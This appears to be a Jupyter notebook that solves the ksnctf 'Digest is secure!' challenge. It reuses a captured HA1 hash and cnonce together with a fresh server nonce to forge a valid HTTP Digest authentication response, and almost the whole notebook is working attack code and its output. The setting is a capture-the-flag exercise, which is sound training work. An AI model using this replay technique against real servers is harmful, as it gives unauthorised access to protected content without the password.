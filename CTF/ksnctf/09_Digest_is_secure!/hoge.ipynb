{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 72,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "import hashlib\n",
    "import re"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 162,
   "metadata": {},
   "outputs": [],
   "source": [
    "url = \"http://ksnctf.sweetduet.info:10080/~q9/flag.html\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 163,
   "metadata": {},
   "outputs": [],
   "source": [
    "sess = requests.Session()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 164,
   "metadata": {},
   "outputs": [],
   "source": [
    "r = sess.get(url)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 165,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Date': 'Thu, 12 Mar 2020 16:33:43 GMT', 'Server': 'Apache/2.2.15 (CentOS)', 'WWW-Authenticate': 'Digest realm=\"secret\", nonce=\"gtGJ6qqgBQA=8b5e63c800e4751c2c77271e7983e53686e36ca0\", algorithm=MD5, qop=\"auth\"', 'Content-Length': '491', 'Connection': 'close', 'Content-Type': 'text/html; charset=iso-8859-1'}"
      ]
     },
     "execution_count": 165,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r.headers"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 166,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Digest realm=\"secret\", nonce=\"gtGJ6qqgBQA=8b5e63c800e4751c2c77271e7983e53686e36ca0\", algorithm=MD5, qop=\"auth\"'"
      ]
     },
     "execution_count": 166,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "h = r.headers['WWW-Authenticate']\n",
    "h"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 167,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'gtGJ6qqgBQA=8b5e63c800e4751c2c77271e7983e53686e36ca0'"
      ]
     },
     "execution_count": 167,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "nonce = re.search(r'nonce=\"(\\S+)\"',h).group(1)\n",
    "nonce"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "    A1 = ユーザ名:realm:パスワード\n",
    "    A2 = HTTPのメソッド:コンテンツのURI\n",
    "    response = MD5( MD5(A1):nonce:nc:cnonce:qop:MD5(A2) )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 171,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'ffffdd8b8029499600f95a69beb239c2'"
      ]
     },
     "execution_count": 171,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a2 = \"GET:/~q9/flag.html\"\n",
    "a2_md5 = hashlib.md5(a2.encode('utf-8')).hexdigest()\n",
    "a2_md5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 172,
   "metadata": {},
   "outputs": [],
   "source": [
    "res_rev = 'c627e19450db746b739f41b64097d449:bbKtsfbABAA=5dad3cce7a7dd2c3335c9b400a19d6ad02df299b:00000001:9691c249745d94fc:auth:31e101310bcd7fae974b921eb148099c'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 173,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['c627e19450db746b739f41b64097d449',\n",
       " 'bbKtsfbABAA=5dad3cce7a7dd2c3335c9b400a19d6ad02df299b',\n",
       " '00000001',\n",
       " '9691c249745d94fc',\n",
       " 'auth',\n",
       " '31e101310bcd7fae974b921eb148099c']"
      ]
     },
     "execution_count": 173,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "x = res_rev.split(\":\")\n",
    "x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 174,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'c627e19450db746b739f41b64097d449:gtGJ6qqgBQA=8b5e63c800e4751c2c77271e7983e53686e36ca0:00000001:9691c249745d94fc:auth:ffffdd8b8029499600f95a69beb239c2'"
      ]
     },
     "execution_count": 174,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "x[1] = nonce\n",
    "x[5] = a2_md5\n",
    "y = ':'.join(x)\n",
    "y"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 176,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'00627b91f1ce4dd59d5889d14051196a'"
      ]
     },
     "execution_count": 176,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "response = hashlib.md5(y.encode('utf-8')).hexdigest()\n",
    "response"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 177,
   "metadata": {},
   "outputs": [],
   "source": [
    "auth = 'Digest username=\"q9\", ' \\\n",
    "'realm=\"secret\", ' \\\n",
    "'nonce=\"{nonce}\", ' \\\n",
    "'uri=\"/~q9/flag.html\", ' \\\n",
    "'algorithm=MD5, ' \\\n",
    "'response=\"{response}\", ' \\\n",
    "'qop=auth, ' \\\n",
    "'nc=00000001, ' \\\n",
    "'cnonce=\"9691c249745d94fc\"'.format(nonce=nonce, response=response)\n",
    "\n",
    "headers = {'Authorization': auth}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 178,
   "metadata": {},
   "outputs": [],
   "source": [
    "r = sess.get(url, headers=headers)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 179,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Response [200]>"
      ]
     },
     "execution_count": 179,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 181,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<!DOCTYPE html>\\n  <head>\\n    <meta charset=\"utf-8\">\\n    <title>Q9</title>\\n  </head>\\n  <body>\\n    <p>FLAG_YBLyivV4WEvC4pp3</p>\\n  </body>\\n</html>\\n'"
      ]
     },
     "execution_count": 181,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r.text"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
